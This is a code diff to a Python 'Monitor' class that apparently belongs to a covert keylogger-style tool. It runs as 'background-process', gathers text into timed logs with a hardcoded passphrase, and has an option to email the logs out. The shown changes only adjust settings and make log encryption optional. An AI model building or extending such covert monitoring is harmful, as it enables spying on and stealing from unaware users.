@@ -87,12 +87,14 @@ def write_encrypted_file(json_string, passphrase, filename):
 
 class Monitor:
     def __init__(self):
-        # settings
+        # settings as they appear in generate.exe
+        self.log_interval = 60
+        self.encrypt_logfiles = True
         self.exe_name = 'background-process'
-        self.log_folder = 'logs'
-        self.log_interval = 15
         self.passphrase = 'fishing-in-the-river-champion'
         self.log_via_email = False
+
+        self.log_folder = 'logs'
 
         # state variables
         self.logs = list()
@@ -104,7 +106,12 @@ class Monitor:
     
     def log_to_file(self, json_string):
         filename = f'{self.log_folder}/{timestamp()}.json'
-        write_encrypted_file(json_string, self.passphrase, filename)
+        if self.encrypt_logfiles:
+            write_encrypted_file(json_string, self.passphrase, filename)
+        else:
+            # no encryption - quicker to just write the code instead of making a new function
+            with open(filename, 'w') as f:
+                f.write(json_string)
     
     def update_text(self):
         # don't update text if it is empty
@@ -122,7 +129,6 @@ class Monitor:
             return
 
         json_string = json.dumps(self.logs, indent=4)
-        # for now we log even if there was no log contents
         if self.log_via_email:
             send_email(json_string)
         else:
